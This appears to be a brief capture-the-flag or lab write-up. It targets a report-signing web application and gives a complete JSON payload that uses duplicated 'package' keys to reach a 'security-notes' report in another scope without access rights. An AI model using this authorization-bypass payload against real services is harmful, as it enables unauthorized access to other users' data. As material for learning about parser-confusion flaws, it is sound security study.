Application - high level

  • Register and login and logout endpoints.
  • View your reports history.
  • View specific report - GUID.

Reports needs to be signed then published for preflight.

Overview

I am targeting security-notes report, which I don't have access to. To perform the exploit, two HTTP requests need to be sent using the following payload.

Payload used for exploiting JSON key duplication (scope value should be your namespace, only on first value "reab-..."):

{
  "package": {
    "scope": "reab-b088927e",
    "name": "security-notes",
    "version": "1.0.0"
  },
  "package": {
    "scope": "core",
    "name": "security-notes",
    "version": "1.0.0"
  },
  "metadata": {
    "description": "Compatibility check",
    "visibility": "private"
  },
  "operation": "preflight"
}
